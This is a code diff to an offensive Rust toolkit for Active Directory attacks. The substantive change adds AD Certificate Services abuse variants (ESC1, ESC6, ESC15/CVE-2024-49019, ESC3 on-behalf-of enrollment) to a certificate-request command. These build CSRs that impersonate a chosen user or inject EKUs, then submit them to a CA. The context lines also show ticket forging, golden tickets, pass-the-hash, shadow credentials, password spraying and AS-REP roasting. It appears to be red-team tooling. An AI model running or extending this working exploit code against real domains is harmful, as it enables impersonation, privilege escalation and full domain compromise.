@@ -386,7 +386,7 @@ struct PthArgs {
     /// Forge RC4-HMAC (etype 23) — interpret the given key as an NT hash (32 hex; legacy DCs).
     #[arg(long)]
     rc4: bool,
-    /// Target SPN for the service ticket (default cifs/<host>).
+    /// Target SPN for the service ticket (default `cifs/<host>`).
     #[arg(long)]
     spn: Option<String>,
     /// Identity to impersonate (default Administrator).
@@ -468,6 +468,21 @@ struct GoldenArgs {
     verify_spn: Option<String>,
 }
 
+#[derive(clap::ValueEnum, Clone, Debug, PartialEq, Eq)]
+enum EscVariant {
+    /// Default: enrollee-supplies-subject → UPN SAN in the CSR.
+    Esc1,
+    /// SAN as CA `pctbAttribs` request-attribute — targets CAs with
+    /// `EDITF_ATTRIBUTESUBJECTALTNAME2` set on the CA (identify via `enum esc`).
+    Esc6,
+    /// EKUwu / CVE-2024-49019 — inject an EKU via Microsoft
+    /// `Application Policies` extension against a schema-v1 template.
+    Esc15,
+    /// CMC EnrollOnBehalfOf — wrap a target CSR + sign as an
+    /// Enrollment Agent (requires `--agent-cert` + `--agent-key`).
+    Esc3,
+}
+
 #[derive(Parser)]
 struct CertipyArgs {
     /// CA name (e.g. `corp-CA`) — target `pKIEnrollmentService.cn`.
@@ -511,6 +526,28 @@ struct CertipyArgs {
     /// Password (required when --host is set).
     #[arg(long, default_value = "")]
     password: String,
+
+    /// ESC variant to exercise. Default `esc1` = classic SAN-in-CSR.
+    #[arg(long, value_enum, default_value = "esc1")]
+    esc: EscVariant,
+    /// ESC6 SAN request-attribute UPN (defaults to `--target-upn`).
+    /// Only used when `--esc esc6` — the SAN is sent as a
+    /// `SAN:upn=<value>` line in the CA's `pctbAttribs` field.
+    #[arg(long)]
+    san_upn: Option<String>,
+    /// ESC3: PEM path of the Enrollment Agent's certificate.
+    /// Required with `--esc esc3`.
+    #[arg(long)]
+    agent_cert: Option<String>,
+    /// ESC3: PEM path of the Enrollment Agent's RSA private key.
+    /// Required with `--esc esc3`.
+    #[arg(long)]
+    agent_key: Option<String>,
+    /// ESC15: additional EKU OID to inject via Microsoft Application
+    /// Policies (default `1.3.6.1.5.5.7.3.2` = Client Authentication).
+    /// Only used when `--esc esc15`.
+    #[arg(long, default_value = "1.3.6.1.5.5.7.3.2")]
+    esc15_eku: String,
 }
 
 #[derive(Parser)]
@@ -539,7 +576,7 @@ struct Esc1Args {
     /// After issuing, PKINIT with the cert to obtain a TGT as the impersonated user (→ .ccache)
     #[arg(long)]
     pkinit: bool,
-    /// KDC host[:port] for --pkinit (defaults to --host)
+    /// KDC `host[:port]` for --pkinit (defaults to --host)
     #[arg(long)]
     kdc: Option<String>,
 }
@@ -730,7 +767,7 @@ struct AsktgtArgs {
     /// Kerberos realm, e.g. CORP.LOCAL
     #[arg(long)]
     realm: String,
-    /// KDC host[:port]
+    /// KDC `host[:port]`
     #[arg(long)]
     kdc: String,
     /// Password auth (AES256). Mutually exclusive with --nt-hash.
@@ -739,7 +776,7 @@ struct AsktgtArgs {
     /// NT hash (32 hex) → overpass-the-hash via RC4-HMAC (legacy / RC4-enabled DCs).
     #[arg(long)]
     nt_hash: Option<String>,
-    /// Output ccache path (defaults to <user>.ccache)
+    /// Output ccache path (defaults to `<user>.ccache`)
     #[arg(long)]
     out: Option<String>,
 }
@@ -802,7 +839,7 @@ struct ShadowcredArgs {
     /// If set, also perform PKINIT with the fresh key and print the ccache path.
     #[arg(long)]
     pkinit: bool,
-    /// KDC host[:port] (required with --pkinit).
+    /// KDC `host[:port]` (required with --pkinit).
     #[arg(long)]
     kdc: Option<String>,
     #[arg(long)]
@@ -877,7 +914,7 @@ struct AbuseArgs {
     /// Kerberos realm (pkinit); also the AD DNS domain for --ldap389 base DN
     #[arg(long)]
     realm: Option<String>,
-    /// KDC host[:port] (pkinit)
+    /// KDC `host[:port]` (pkinit)
     #[arg(long)]
     kdc: Option<String>,
     /// add-keycred over raw LDAP-389 + NTLM SASL bind (no LDAPS) — needs --host + --realm
@@ -890,7 +927,7 @@ struct AbuseArgs {
 
 #[derive(Parser)]
 struct SprayArgs {
-    /// KDC host[:port]
+    /// KDC `host[:port]`
     #[arg(long)]
     kdc: String,
     /// Kerberos realm, e.g. CORP.LOCAL
@@ -958,7 +995,7 @@ struct ScanArgs {
     /// Output format for `scan`: `json` (default) or `html`.
     #[arg(long, default_value = "json", value_parser = ["json", "html"])]
     format: String,
-    /// KDC host[:port] for `roast` to actually AS-REP roast (omit = list candidates only)
+    /// KDC `host[:port]` for `roast` to actually AS-REP roast (omit = list candidates only)
     #[arg(long)]
     kdc: Option<String>,
     /// SYSVOL path for `scan` to hunt GPP cpasswords, e.g. \\corp.local\SYSVOL
@@ -4700,11 +4737,26 @@ async fn certipy(a: CertipyArgs) -> Result<()> {
         pem_bytes
     };
 
-    let csr = ms_icpr::build_csr_with_upn_san(&a.subject, &a.target_upn, &key_pem)
-        .context("build_csr_with_upn_san")?;
+    // Build the CSR according to the ESC variant. ESC1/ESC6 use the plain
+    // UPN-SAN CSR; ESC15 injects an EKU via Microsoft Application Policies
+    // (EKUwu shape); ESC3 builds the plain CSR, and the CMS EOBO wrapping
+    // happens later in the dispatch section below.
+    let csr = match a.esc {
+        EscVariant::Esc15 => ms_icpr::build_csr_with_upn_san_and_ekus(
+            &a.subject,
+            &a.target_upn,
+            &[a.esc15_eku.as_str()],
+            &key_pem,
+            ms_icpr::EkuCarrier::ApplicationPolicies,
+        )
+        .context("build_csr_with_upn_san_and_ekus (esc15)")?,
+        _ => ms_icpr::build_csr_with_upn_san(&a.subject, &a.target_upn, &key_pem)
+            .context("build_csr_with_upn_san")?,
+    };
     std::fs::write(&a.csr_out, &csr)?;
     eprintln!(
-        "[+] CSR built (subject CN={}, SAN otherName+UPN={}) → {} ({} bytes)",
+        "[+] CSR built (variant={:?}, subject CN={}, SAN otherName+UPN={}) → {} ({} bytes)",
+        a.esc,
         a.subject,
         a.target_upn,
         a.csr_out,
@@ -4756,7 +4808,41 @@ async fn certipy(a: CertipyArgs) -> Result<()> {
         let mut client =
             ms_icpr::IcprClient::connect(host, domain, user, &a.password, a.ca.clone())
                 .context("ms_icpr::IcprClient::connect (sealed \\PIPE\\cert)")?;
-        match client.submit_request(&template, &csr) {
+        let submit_result = match a.esc {
+            EscVariant::Esc1 | EscVariant::Esc15 => client.submit_request(&template, &csr),
+            EscVariant::Esc6 => {
+                let san = a.san_upn.as_deref().unwrap_or(a.target_upn.as_str());
+                client.submit_request_esc6(&template, &csr, san)
+            }
+            EscVariant::Esc3 => {
+                let agent_cert_path = a
+                    .agent_cert
+                    .as_deref()
+                    .ok_or_else(|| anyhow::anyhow!("--agent-cert required with --esc esc3"))?;
+                let agent_key_path = a
+                    .agent_key
+                    .as_deref()
+                    .ok_or_else(|| anyhow::anyhow!("--agent-key required with --esc esc3"))?;
+                let agent_cert = std::fs::read(agent_cert_path)
+                    .with_context(|| format!("read --agent-cert {agent_cert_path}"))?;
+                let agent_key = std::fs::read(agent_key_path)
+                    .with_context(|| format!("read --agent-key {agent_key_path}"))?;
+                let signing_time = std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .map(|d| d.as_secs() as i64)
+                    .unwrap_or(0);
+                let cms_blob =
+                    ms_icpr::build_esc3_request(&csr, &agent_cert, &agent_key, signing_time)
+                        .context("ms_icpr::build_esc3_request (CMC EOBO)")?;
+                eprintln!(
+                    "[+] built CMS-signed CMC blob ({} bytes) — submitting as enrollment-agent-on-behalf-of {}",
+                    cms_blob.len(),
+                    a.target_upn
+                );
+                client.submit_request_esc3(&template, &cms_blob)
+            }
+        };
+        match submit_result {
             Ok(issued) => {
                 let cert_path = format!("{}.issued.pem", a.csr_out);
                 std::fs::write(&cert_path, &issued.pem)?;
